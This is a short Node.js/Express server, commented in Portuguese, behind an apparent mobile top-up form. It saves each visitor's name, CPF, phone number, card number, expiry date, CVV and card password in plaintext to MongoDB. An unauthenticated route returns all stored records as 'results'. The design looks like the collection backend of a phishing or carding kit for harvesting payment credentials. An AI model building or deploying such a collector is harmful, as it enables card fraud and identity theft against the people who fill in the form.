const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Conexão com MongoDB (Mantenha sua senha segura!)
mongoose.connect('mongodb+srv://mateus:SUA_SENHA_AQUI@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
  .then(() => console.log('MongoDB Conectado com Sucesso!'))
  .catch(err => console.error('Erro na conexão:', err));

// Schema atualizado incluindo o CPF
const RecargaSchema = new mongoose.Schema({
    operadora: String,
    nome: String,
    cpf: String,
    telefone: String,
    valor: String,
    cartao: String,
    data: String,
    cvv: String,
    senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// Rota para salvar os dados vindos do formulário
app.post('/finalizar', async (req, res) => {
    try {
        const novaRecarga = new Recarga(req.body);
        await novaRecarga.save();
        res.status(200).send('Sucesso');
    } catch (error) {
        console.error(error);
        res.status(500).send('Erro ao salvar no banco');
    }
});

// Painel administrativo para ver os resultados
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) {
        res.status(500).json({ error: "Erro ao buscar dados" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));